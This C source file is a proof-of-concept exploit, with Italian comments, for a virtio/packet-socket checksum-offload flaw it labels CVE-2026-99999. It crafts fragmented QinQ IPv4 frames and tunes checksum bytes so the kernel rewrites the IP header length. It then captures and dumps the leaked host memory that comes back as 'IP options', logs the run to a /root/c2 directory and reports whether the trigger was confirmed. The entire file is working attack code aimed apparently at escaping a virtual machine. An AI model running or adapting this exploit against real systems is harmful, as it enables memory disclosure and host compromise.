/* pwnescape_all.c — CVE-2026-99999 PoC (sender + readback + diagnostica)
 * gcc -O2 -Wall -pthread -o pwnescape_all pwnescape_all.c
 * Usage (root): ./pwnescape_all <iface> <src_ip> <dst_ip> <frag_id> [csum_start] [csum_offset]
 * Log: /root/c2/log.txt (append); leak bytes also dumped to stdout
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/virtio_net.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <stdint.h>

#ifndef IP_MF
#define IP_MF 0x2000
#endif
#ifndef PACKET_VNET_HDR
#define PACKET_VNET_HDR 15
#endif
#ifndef VIRTIO_NET_HDR_F_NEEDS_CSUM
#define VIRTIO_NET_HDR_F_NEEDS_CSUM 1
#endif
#ifndef IFF_VNET_HDR
#define IFF_VNET_HDR 0x40000
#endif

#define IHL_FLIP_HI 0x4f
#define QINQ_HDR_LEN 22
#define IP4_HDR_LEN 20
#define ETH_HDR_LEN 14
#define VNET_HDR_LEN 10
#define FILL_BYTE 0x41
#define LOG_PATH "/root/c2/log.txt"
#define RX_WINDOW_SEC 30
#define MAX_TAIL 64
#define MAX_DIAG 8

static FILE *g_log;
static pthread_mutex_t g_log_mu = PTHREAD_MUTEX_INITIALIZER;

static void lg(const char *fmt, ...) {
    va_list ap;
    time_t t = time(NULL);
    char ts[32];
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", localtime(&t));
    pthread_mutex_lock(&g_log_mu);
    if (g_log) {
        fprintf(g_log, "[%s] ", ts);
        va_start(ap, fmt); vfprintf(g_log, fmt, ap); va_end(ap);
        fputc('\n', g_log);
        fflush(g_log);
    }
    fprintf(stderr, "[%s] ", ts);
    va_start(ap, fmt); vfprintf(stderr, fmt, ap); va_end(ap);
    fputc('\n', stderr);
    fflush(stderr);
    pthread_mutex_unlock(&g_log_mu);
}

/* ---------- checksum helpers ---------- */
static uint16_t fold16(uint32_t s) {
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return (uint16_t)(~s & 0xffff);
}
static uint32_t be_sum(const uint8_t *p, int n) {
    uint32_t s = 0;
    for (int i = 0; i + 1 < n; i += 2) s += ((uint32_t)p[i] << 8) | p[i + 1];
    if (n & 1) s += (uint32_t)p[n - 1] << 8;
    return s;
}
static uint16_t iph_checksum(const uint8_t *h, int len) {
    return fold16(be_sum(h, len));
}

/* Il kernel scrive a csum_start+csum_offset il complemento a 16 bit della
 * somma del flusso. Vogliamo che il byte BASSO del checksum risultante sia
 * 0x4f, così il byte ip[0] diventa 0x4f (IHL=60). */
static int tune_payload(uint8_t *p1, uint32_t base_sum) {
    for (int x = 0; x < 256; x++)
        for (int y = 0; y < 256; y++) {
            uint16_t f = fold16(base_sum + ((uint32_t)x << 8) + (uint32_t)y);
            if ((f & 0x00ff) == IHL_FLIP_HI) {
                p1[0] = (uint8_t)x; p1[1] = (uint8_t)y;
                return 0;
            }
        }
    return -1;
}

/* ---------- diagnostica interfaccia ---------- */
static void diag_iface(const char *ifname, int mtu) {
    /* flags IFF_VNET_HDR? */
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd >= 0) {
        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
        if (ioctl(fd, SIOCGIFFLAGS, &ifr) == 0) {
            int vnet = (ifr.ifr_flags & IFF_VNET_HDR) ? 1 : 0;
            lg("[diag] iface=%s mtu=%d IFF_VNET_HDR=%s (flags=0x%x)",
               ifname, mtu, vnet ? "SI" : "NO", (unsigned)ifr.ifr_flags);
            if (!vnet)
                lg("[diag] ATTENZIONE: IFF_VNET_HDR assente -> PACKET_VNET_HDR non passera' i metadati di checksum");
        } else {
            lg("[diag] SIOCGIFFLAGS: %s", strerror(errno));
        }
        close(fd);
    }
}

/* ---------- socket ---------- */
static int open_pkt_sock(const char *ifname, int vnet) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { lg("socket: %s", strerror(errno)); return -1; }
    if (vnet) {
        int one = 1;
        if (setsockopt(fd, SOL_PACKET, PACKET_VNET_HDR, &one, sizeof(one)) < 0) {
            lg("PACKET_VNET_HDR: %s (serve IFF_VNET_HDR)", strerror(errno));
            close(fd); return -1;
        } else {
            lg("[diag] PACKET_VNET_HDR attivato sul socket TX");
        }
    }
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex  = (int)if_nametoindex(ifname);
    if (!sll.sll_ifindex) { lg("iface %s: %s", ifname, strerror(errno)); close(fd); return -1; }
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) { lg("bind: %s", strerror(errno)); close(fd); return -1; }
    return fd;
}
static int iface_mtu(const char *ifname) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 1500;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';
    int mtu = 1500;
    if (ioctl(fd, SIOCGIFMTU, &ifr) == 0) mtu = ifr.ifr_mtu;
    close(fd);
    return mtu;
}

/* ---------- TX ---------- */
static int send_vnet(int fd, const uint8_t *frame, size_t flen,
                     uint16_t csum_start, uint16_t csum_offset, uint8_t flags) {
    static uint8_t buf[9400];
    const size_t hs = VNET_HDR_LEN;
    if (hs + flen > sizeof(buf)) { errno = EMSGSIZE; return -1; }
    struct virtio_net_hdr *vh = (struct virtio_net_hdr *)buf;
    memset(vh, 0, hs);
    vh->flags = flags;
    vh->csum_start = csum_start;
    vh->csum_offset = csum_offset;
    memcpy(buf + hs, frame, flen);
    return (int)send(fd, buf, hs + flen, 0);
}

static void qinq_ip_header(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
                           uint32_t saddr, uint32_t daddr, uint16_t id,
                           uint16_t frag_off_mf, int plen) {
    memcpy(f, dhost, 6); memcpy(f + 6, shost, 6);
    f[12] = 0x88; f[13] = 0xa8;
    f[14] = 0x00; f[15] = 0x0a; f[16] = 0x81; f[17] = 0x00;
    f[18] = 0x00; f[19] = 0x0a; f[20] = 0x08; f[21] = 0x00;
    uint8_t *ip = f + QINQ_HDR_LEN;
    ip[0] = 0x45; ip[1] = 0x00;
    *(uint16_t *)(ip + 2) = htons((uint16_t)(IP4_HDR_LEN + plen));
    *(uint16_t *)(ip + 4) = htons(id);
    *(uint16_t *)(ip + 6) = htons(frag_off_mf);
    ip[8] = 64; ip[9] = IPPROTO_UDP;
    memcpy(ip + 12, &saddr, 4); memcpy(ip + 16, &daddr, 4);
    *(uint16_t *)(ip + 10) = iph_checksum(ip, IP4_HDR_LEN);
}
static void build_frag1(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
                        uint32_t saddr, uint32_t daddr, uint16_t id, const uint8_t *p1) {
    qinq_ip_header(f, dhost, shost, saddr, daddr, id, IP_MF, 8);
    memcpy(f + QINQ_HDR_LEN + IP4_HDR_LEN, p1, 8);
}
static void build_tail(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
                       uint32_t saddr, uint32_t daddr, uint16_t id,
                       uint16_t off_units, int last, int plen) {
    qinq_ip_header(f, dhost, shost, saddr, daddr, id,
                   (uint16_t)(off_units | (last ? 0 : IP_MF)), plen);
    memset(f + QINQ_HDR_LEN + IP4_HDR_LEN, FILL_BYTE, (size_t)plen);
}

static uint32_t compute_base(const uint8_t *frag1, size_t frag1_len,
                             uint8_t tails[][QINQ_HDR_LEN + IP4_HDR_LEN + 9200],
                             int n_tail, int tail_len, uint16_t csum_start) {
    uint32_t s = 0;
    s += be_sum(frag1 + csum_start, (int)(frag1_len - csum_start));
    for (int i = 0; i < n_tail; i++)
        s += be_sum(tails[i] + csum_start, tail_len - csum_start);
    return s;
}

/* ---------- thread RX ---------- */
static volatile int g_run = 1;
static uint16_t g_want_id;
static int g_seen_frag, g_seen_mutated;
static int g_diag_other = 0;   /* conta IPv4 con ID diverso, loggati MAX_DIAG volte */
static int g_diag_outgoing = 0;

static void dump_leak(const uint8_t *p, int n, const char *why) {
    char hex[3 * 64 + 1], asc[64 + 1];
    int hn = 0, an = 0, m = n > 60 ? 60 : n;
    for (int i = 0; i < m; i++) {
        hn += snprintf(hex + hn, sizeof(hex) - (size_t)hn, "%02x ", p[i]);
        asc[an++] = (p[i] >= 0x20 && p[i] < 0x7f) ? (char)p[i] : '.';
    }
    hex[hn] = '\0'; asc[an] = '\0';
    printf("LEAK[%s] len=%d hex: %s\n", why, n, hex);
    printf("LEAK[%s] ascii: %s\n", why, asc);
    fflush(stdout);
    lg("    leak hex: %s", hex);
    lg("    leak ascii: %s", asc);
}

static void *rx_thread(void *arg) {
    int fd = open_pkt_sock((const char *)arg, 0);
    if (fd < 0) return NULL;
    uint8_t buf[9500];
    time_t t0 = time(NULL);
    while (g_run && time(NULL) - t0 < RX_WINDOW_SEC) {
        struct sockaddr_ll from;
        socklen_t alen = sizeof(from);
        ssize_t n = recvfrom(fd, buf, sizeof(buf), 0, (struct sockaddr *)&from, &alen);
        if (n < (ssize_t)(14 + 20)) continue;
        /* diagnostica: logga i primi PACKET_OUTGOING visti */
        if (from.sll_pkttype == PACKET_OUTGOING) {
            if (g_diag_outgoing < MAX_DIAG) {
                lg("[diag rx] PACKET_OUTGOING n=%zd (scartato)", n);
                g_diag_outgoing++;
            }
            continue;
        }
        uint8_t *ip = buf + 14;
        size_t hdr_rem = (size_t)n - 14;
        uint16_t ethertype = (uint16_t)((buf[12] << 8) | buf[13]);
        while ((ethertype == 0x8100 || ethertype == 0x88a8) && hdr_rem >= 4) {
            ethertype = (uint16_t)((ip[2] << 8) | ip[3]);
            ip += 4; hdr_rem -= 4;
        }
        if (ethertype != 0x0800) continue;
        if (hdr_rem < 20) continue;
        uint8_t ihl = (uint8_t)((ip[0] & 0x0f) * 4);
        uint16_t id = (uint16_t)((ip[4] << 8) | ip[5]);
        if (id != g_want_id) {
            if (g_diag_other < MAX_DIAG) {
                lg("[diag rx] IPv4 id=0x%04x (atteso 0x%04x) iph[0]=0x%02x len=%zd pkttype=%d",
                   id, g_want_id, ip[0], n, from.sll_pkttype);
                g_diag_other++;
            }
            continue;
        }
        g_seen_frag = 1;
        lg("[frag rx] id=0x%04x iph[0]=0x%02x ihl=%u tot_len=%u off=0x%04x pkttype=%d",
           id, ip[0], ihl, (ip[2] << 8) | ip[3], (ip[6] << 8) | ip[7], from.sll_pkttype);
        if (ip[0] == IHL_FLIP_HI) {
            g_seen_mutated = 1;
            int opts_len = (int)ihl - 20;
            if (opts_len < 0) opts_len = 0;
            if ((size_t)(20 + opts_len) > hdr_rem) opts_len = (int)hdr_rem - 20;
            if (opts_len < 0) opts_len = 0;
            int leaked = 0;
            for (int i = 20; i < 20 + opts_len; i++)
                if (ip[i] != FILL_BYTE) leaked++;
            lg("[+] IHL MUTATO (0x4f): %d byte di 'options', %d != 0x%02x",
               opts_len, leaked, FILL_BYTE);
            dump_leak(ip + 20, opts_len, "ip-options");
        }
    }
    close(fd);
    return NULL;
}

/* ---------- main ---------- */
int main(int argc, char **argv) {
    const char *ifname = argc > 1 ? argv[1] : "eth0";
    uint32_t saddr = inet_addr(argc > 2 ? argv[2] : "192.0.2.2");
    uint32_t daddr = inet_addr(argc > 3 ? argv[3] : "192.0.2.1");
    uint16_t id    = argc > 4 ? (uint16_t)strtoul(argv[4], NULL, 0) : 0x1337;
    uint16_t csum_start = argc > 5 ? (uint16_t)atoi(argv[5]) : 22;
    uint16_t csum_off   = argc > 6 ? (uint16_t)atoi(argv[6]) : 0;

    mkdir("/root/c2", 0755);
    g_log = fopen(LOG_PATH, "a");
    if (!g_log) { perror("fopen log"); }
    g_want_id = id;

    uint8_t dhost[6] = { 0x02, 0xfc, 0x00, 0x00, 0x00, 0x05 };
    uint8_t shost[6] = { 0x02, 0xfc, 0x00, 0x00, 0x00, 0x01 };
    uint8_t p1[8]    = { 0xde, 0xad, 0xbe, 0xef, 0x00, 0x00, 0xde, 0xad };

    int mtu = iface_mtu(ifname);
    int max_frame = mtu + ETH_HDR_LEN + 4 - VNET_HDR_LEN;
    int plen = (max_frame - (QINQ_HDR_LEN + IP4_HDR_LEN)) & ~7;
    if (plen < 400) { lg("MTU %d troppo piccolo", mtu); return 1; }
    int n_tail = (mtu - 28) / plen + 1;
    if (n_tail > MAX_TAIL) { lg("n_tail %d > MAX_TAIL", n_tail); return 1; }
    lg("=== start iface=%s mtu=%d plen=%d n_tail=%d id=0x%04x csum_start=%u csum_off=%u",
       ifname, mtu, plen, n_tail, id, csum_start, csum_off);
    diag_iface(ifname, mtu);

    static uint8_t f1[QINQ_HDR_LEN + IP4_HDR_LEN + 8];
    static uint8_t tail_store[MAX_TAIL][QINQ_HDR_LEN + IP4_HDR_LEN + 9200];
    const int tail_len = QINQ_HDR_LEN + IP4_HDR_LEN + plen;
    if (tail_len > (int)sizeof(tail_store[0])) { lg("plen overflow"); return 1; }

    build_frag1(f1, dhost, shost, saddr, daddr, id, p1);
    for (int i = 0; i < n_tail; i++) {
        uint16_t off = (uint16_t)(1 + i * (plen / 8));
        build_tail(tail_store[i], dhost, shost, saddr, daddr, id, off,
                   i == n_tail - 1, plen);
    }

    uint32_t base = compute_base(f1, sizeof(f1), tail_store, n_tail, tail_len, csum_start);
    if (tune_payload(p1, base) < 0) { lg("tuning fallito"); return 1; }
    build_frag1(f1, dhost, shost, saddr, daddr, id, p1);
    lg("[diag] tuning ok: p1[0]=0x%02x p1[1]=0x%02x (frag1 iph[0]=0x%02x)",
       p1[0], p1[1], f1[QINQ_HDR_LEN]);

    pthread_t rx;
    if (pthread_create(&rx, NULL, rx_thread, (void *)ifname) != 0) { lg("pthread_create"); return 1; }
    usleep(200000);

    int fd = open_pkt_sock(ifname, 1);
    if (fd < 0) { g_run = 0; pthread_join(rx, NULL); return 1; }

    for (int i = 0; i < n_tail; i++) {
        ssize_t r = send_vnet(fd, tail_store[i], (size_t)tail_len, 0, 0, 0);
        if (r < 0) lg("send tail %d: %s", i, strerror(errno));
        usleep(1000);
    }
    usleep(2000);
    ssize_t r1 = send_vnet(fd, f1, sizeof(f1), csum_start, csum_off, VIRTIO_NET_HDR_F_NEEDS_CSUM);
    if (r1 < 0)
        lg("send frag1: %s", strerror(errno));
    else
        lg("[+] TX completato: %d tail + frag1 (csum_start=%u, csum_offset=%u, ret=%zd); attendo RX %d s",
           n_tail, csum_start, csum_off, r1, RX_WINDOW_SEC);
    close(fd);

    pthread_join(rx, NULL);
    if (g_seen_mutated)
        lg("[+] VERDETTO: TRIGGER CONFERMATO (0x4f osservato in ingresso)");
    else if (g_seen_frag)
        lg("[-] VERDETTO: frammenti tornati ma drift non avvenuto (tx offload? decap VLAN? csum_start? patch host?)");
    else
        lg("[-] VERDETTO: nessun frammento id=0x%04x tornato (bounce/NAT assente o defrag host assente)", id);
    if (g_log) fclose(g_log);
    return g_seen_mutated ? 0 : 1;
}
